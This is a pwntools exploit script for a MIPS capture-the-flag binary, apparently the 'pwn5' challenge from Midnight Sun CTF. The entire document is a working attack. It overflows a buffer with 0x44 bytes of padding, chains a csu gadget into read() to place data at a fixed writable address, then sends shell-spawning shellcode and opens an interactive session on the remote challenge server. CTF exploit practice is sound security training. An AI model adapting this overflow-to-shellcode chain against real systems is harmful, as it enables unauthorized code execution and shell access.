from pwn import *

context.arch = "mips"

#p = process(["qemu-mipsel","-g","1234","./pwn5"])
p = remote("pwn5-01.play.midnightsunctf.se",10005)

csu = 0x00400500
read = 0x41d77c

pay  = "A" * 0x44

pay += p32(csu)
pay += "A"*0x1c
pay += p32(0xff) #s0
pay += p32(0x49d000) #s1
pay += p32(0) #s2
pay += p32(0xff) #s3
pay += p32(read)
pay += p32(0x49d000) * 0x10
p.sendlineafter("data:",pay)

p.send(asm(shellcraft.sh()))
p.interactive()
